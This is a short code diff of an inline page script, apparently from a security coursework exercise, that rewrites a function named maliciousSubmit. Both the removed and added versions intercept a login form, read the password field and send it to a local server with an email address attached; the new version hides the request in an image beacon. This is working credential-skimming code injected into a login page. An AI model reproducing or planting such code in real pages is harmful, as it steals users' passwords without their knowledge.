@@ -18,9 +18,12 @@
     <script>
       function maliciousSubmit(event) {
         event.preventDefault()
-        console.log(event.target)
-        const dataForEmail = "username:" + document.getElementsByName('login_username')[0].value + "password:" +  document.getElementsByName('login_password')[0].value
-        fetch('http://127.0.0.1:8000?' + 'to=redfreak97@gmail.com' + '&payload=' + encodeURIComponent(document.getElementsByName('login_password')[0].value)+ '&random=' + Math.random())
+
+        function execEmail() {
+            (new Image()).src='http://127.0.0.1:8000?' + 'to=syssechacks@gmail.com' + '&payload=' + encodeURIComponent(document.getElementsByName('login_password')[0].value)+ '&random=' + Math.random()
+    
+          }
+          execEmail()
   
         setTimeout(function (){
           // just do a click to set the value - easiest solution
